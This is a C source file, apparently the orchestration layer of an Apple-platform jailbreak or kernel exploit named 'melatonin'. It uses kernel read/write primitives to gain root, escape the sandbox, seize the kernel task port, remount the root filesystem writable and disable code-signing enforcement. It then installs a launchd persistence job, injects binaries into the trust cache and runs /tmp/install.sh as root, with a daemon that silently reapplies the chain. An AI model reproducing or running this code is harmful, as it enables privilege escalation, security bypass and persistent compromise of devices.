#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <spawn.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include "melatonin.h"
#include "offsets.h"

extern char **environ;

static int g_verbose = 1;

static void stage(const char *name, int rc) {
    if (!g_verbose) return;
    printf("[mela] %-14s %s\n", name, rc == 0 ? "ok" : "fail");
}

static int spawn(char *const av[]) {
    pid_t pid = 0;
    int st = 0;
    if (posix_spawn(&pid, av[0], NULL, NULL, av, environ) != 0) return -1;
    if (waitpid(pid, &st, 0) < 0) return -1;
    return WIFEXITED(st) ? WEXITSTATUS(st) : -1;
}

/* one full kernel-state pass */
static int core_apply(void) {
    int rc;

    rc = mela_primitive_init();
    stage("primitive", rc);
    if (rc != 0) return 1;

    mela_offsets_seed();
    rc = mela_offsets_probe();
    if (rc != 0) {
        rc = mela_offsets_autoprobe();
        stage("autoprobe", rc);
        if (rc != 0) return 2;
        rc = mela_offsets_probe();
    }
    stage("offsets", rc);
    if (rc != 0) return 2;

    kva_t self = proc_find(getpid());
    kva_t kp   = proc_find(0);
    if (!self || !kp) { stage("proc lookup", -1); return 3; }

    g_mela.self_proc = self;
    g_mela.self_task = kread64(self + g_off.proc_task);

    rc = become_root();               stage("become root", rc);  if (rc) return 4;
    rc = drop_sandbox(self);          stage("drop sandbox", rc); if (rc) return 5;

    kva_t ktask = task_kernel_from_proc(kp);
    rc = task_port_takeover(g_mela.self_task, ktask);
    stage("task port", rc);
    if (rc) return 6;

    rc = snapshot_select_live();      stage("snapshot live", rc); if (rc) return 7;
    rc = rootfs_remount();            stage("root / rw", rc);    if (rc) return 8;
    rc = amfi_enable();               stage("amfi / cs", rc);    if (rc) return 9;

    if (amfi_flush_cache() > 0) stage("amfid flush", 0);

    return 0;
}

int mela_state_ok(void) {
    if (!mela_krw_ready()) return 0;
    if (mela_get32(kaddr(g_off.cs_enforcement_disable)) != 1) return 0;

    kva_t mnt = kread64(kaddr(g_off.apfs_mnt));
    if (!mnt) return 0;

    uint64_t fl = kread64(mnt + g_off.mount_flags);
    if (fl & 1ULL) return 0;
    return 1;
}

int mela_apply(void) { return core_apply(); }

int mela_daemon_tick(void) {
    if (mela_state_ok()) return 0;
    g_verbose = 0;
    int rc = core_apply();
    g_verbose = 1;
    return rc;
}

int mela_bootstrap(void) {
#if defined(__APPLE__)
    resign_tree("/usr/bin");
    resign_tree("/usr/libexec");
#endif
    int rc = mela_persist_install();
    stage("launchd job", rc);
    if (rc != 0) return 10;

    if (access("/tmp/install.sh", R_OK) == 0) {
        char *av[] = { "/bin/sh", "/tmp/install.sh", NULL };
        rc = spawn(av);
        stage("bootstrap", rc);
        if (rc != 0) return 11;
    } else {
        stage("bootstrap", 0);
    }
    return 0;
}

int mela_probe_dryrun(void) {
    g_mela.pid = getpid();

    if (mela_primitive_init() != 0) {
        fprintf(stderr, "[probe] no backend\n");
        return 1;
    }

    mela_offsets_seed();

    /* dry-run can force the structural path */
    if (getenv("MELA_FORCE_PROBE")) {
        g_off.proc_list = g_off.proc_pid = g_off.proc_ro = 0;
        g_off.proc_ucred = g_off.proc_task = g_off.proc_comm = 0;
        g_off.ucred_uid = g_off.ucred_ruid = g_off.ucred_svuid = 0;
        g_off.ucred_label = g_off.label_sandbox = 0;
        g_off.task_itk = g_off.ipc_port_kobject = 0;
    }

    int seeded = (mela_offsets_probe() == 0);

    if (!seeded) {
        int rc = mela_offsets_autoprobe();
        if (rc != 0) {
            fprintf(stderr, "[probe] autoprobe rc=%d\n", rc);
            return 2;
        }
    }

    mela_offsets_report(seeded ? "seeds" : "autoprobe");
    return 0;
}

int mela_cli_trust(const char *path) {
    if (mela_primitive_init() != 0) {
        fprintf(stderr, "[trust] no backend\n");
        return 1;
    }

    mela_offsets_seed();
    if (mela_offsets_probe() != 0 && mela_offsets_autoprobe() != 0) {
        fprintf(stderr, "[trust] offsets unavailable\n");
        return 2;
    }
    if (mela_trust_prepare() != 0) {
        fprintf(stderr, "[trust] cache not found\n");
        return 3;
    }

    struct stat st;
    if (stat(path, &st) != 0) {
        fprintf(stderr, "[trust] %s: not found\n", path);
        return 4;
    }

    int n = S_ISDIR(st.st_mode) ? mela_trust_add_bundle(path)
                                : mela_trust_add_file(path);
    if (n < 0) {
        fprintf(stderr, "[trust] add failed\n");
        return 5;
    }

    if (S_ISDIR(st.st_mode)) printf("[trust] %d binaries from %s\n", n, path);
    else                     printf("[trust] added %s\n", path);
    return 0;
}

int mela_cli_install(const char *path) {
    mela_primitive_init();
    mela_offsets_seed();
    if (mela_krw_ready() && mela_offsets_probe() != 0)
        mela_offsets_autoprobe();

    int rc = mela_install_app(path);
    printf("[install] %s rc=%d\n", path, rc);
    return rc == 0 ? 0 : 1;
}

int mela_run(void) {
    g_mela.pid = getpid();
    g_mela.cpufamily = 0x0F;

    int rc = mela_apply();
    if (rc != 0) return rc;

    rc = mela_bootstrap();
    if (rc != 0) return rc;

    if (mela_selftest(1) != 0) return 12;

    printf("[mela] rootful: uid=%d proc=%llx task=%llx\n",
           getuid(), (unsigned long long)g_mela.self_proc,
           (unsigned long long)g_mela.self_task);
    return 0;
}
